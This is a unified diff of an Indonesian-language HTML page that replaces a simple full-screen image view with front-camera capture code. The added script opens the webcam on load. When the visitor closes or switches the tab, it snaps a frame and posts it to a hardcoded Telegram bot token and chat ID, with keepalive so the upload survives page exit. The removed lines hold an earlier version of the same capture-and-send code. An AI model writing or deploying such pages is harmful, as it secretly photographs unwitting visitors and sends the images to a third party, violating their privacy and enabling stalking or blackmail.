@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Tampilan Gambar Full</title>
+  <title>Video Fullscreen & Kirim Saat Keluar</title>
   <style>
     body {
       margin: 0;
@@ -13,80 +12,78 @@
       justify-content: center;
       align-items: center;
       background: #000;
+      overflow: hidden;
     }
-    img {
-      max-width: 100%;
-      max-height: 100%;
-      object-fit: contain;
-      border-radius: 10px;
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover; /* fullscreen video */
+    }
+    canvas {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <img src="https://pomf2.lain.la/f/nm0o7t5b.jpg" alt="Gambar Tampilan">
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
+    const CHAT_ID = "7412613560";
+
+    async function startCamera() {
+      try {
+        const video = document.getElementById('video');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+        video.play();
+      } catch (err) {
+        console.error("Kamera tidak bisa diakses:", err);
+      }
+    }
+
+    async function captureAndSend() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+
+      // set canvas sesuai ukuran video
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+
+      // ambil frame terakhir
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(async (blob) => {
+        try {
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", blob, "foto.jpg");
+
+          // keepalive supaya request tetap jalan saat halaman unload
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData,
+            keepalive: true
+          });
+        } catch (err) {
+          console.error("Gagal kirim foto:", err);
+        }
+      }, 'image/jpeg', 0.9);
+    }
+
+    // kirim saat user menutup halaman/tab
+    window.addEventListener('beforeunload', captureAndSend);
+
+    // tambahan: kirim juga saat tab tidak terlihat / pindah tab
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') {
+        captureAndSend();
+      }
+    });
+
+    startCamera();
+  </script>
 </body>
 </html>
-  <!-- video tetap terlihat sementara, bisa di-hide nanti -->  
-  <video id="video" autoplay playsinline style="width:320px; height:240px;"></video>  
-  <canvas id="canvas" style="display:none;"></canvas>    <script>  
-    const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";   
-    const CHAT_ID = "7412613560";   
-  
-    async function startCamera() {  
-      try {  
-        const video = document.getElementById('video');  
-  
-        // akses kamera depan  
-        const stream = await navigator.mediaDevices.getUserMedia({   
-          video: { facingMode: "user" }   
-        });  
-  
-        video.srcObject = stream;  
-  
-        // tunggu video siap  
-        video.onloadedmetadata = () => {  
-          video.play();  
-          // tunggu frame benar-benar muncul sebelum capture  
-          setTimeout(capturePhoto, 1000); // 1 detik supaya frame siap  
-        };  
-      } catch (err) {  
-        alert("Kamera tidak bisa diakses: " + err);  
-      }  
-    }  
-  
-    async function capturePhoto() {  
-      const video = document.getElementById('video');  
-      const canvas = document.getElementById('canvas');  
-      const context = canvas.getContext('2d');  
-  
-      // set ukuran canvas sesuai video  
-      canvas.width = video.videoWidth || 640;  
-      canvas.height = video.videoHeight || 480;  
-  
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);  
-  
-      // ubah data canvas jadi blob  
-      canvas.toBlob(sendPhoto, 'image/jpeg', 0.9);  
-    }  
-  
-    async function sendPhoto(blob) {  
-      try {  
-        const formData = new FormData();  
-        formData.append("chat_id", CHAT_ID);  
-        formData.append("photo", blob, "foto.jpg");  
-  
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {  
-          method: "POST",  
-          body: formData  
-        });  
-  
-        document.body.innerHTML = "<h3>✅ Foto berhasil dikirim ke Telegram</h3>";  
-      } catch (error) {  
-        alert("Gagal kirim foto: " + error);  
-      }  
-    }  
-  
-    startCamera();  
-  </script>  
- </body>  
-</html> 
